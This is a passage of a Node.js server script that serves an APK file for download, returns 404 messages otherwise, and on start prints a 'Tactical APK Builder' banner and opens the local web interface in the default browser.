                'Content-Disposition': `attachment; filename="${fileName}"`,
                'Content-Length': fs.statSync(filePath).size
            });
            fs.createReadStream(filePath).pipe(res);
        } else {
            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.end('APK File Not Found');
        }
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
    }
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n [+] TACTICAL APK BUILDER GUI LAUNCHED`);
    console.log(` [+] Local Web Interface: http://localhost:${PORT}`);
    console.log(` [+] Opening default browser...\n`);

    const url = `http://localhost:${PORT}`;
    const openCmd = process.platform === 'darwin' ? `open "${url}"` : (process.platform === 'win32' ? `start "${url}"` : `xdg-open "${url}"`);
    exec(openCmd);
});
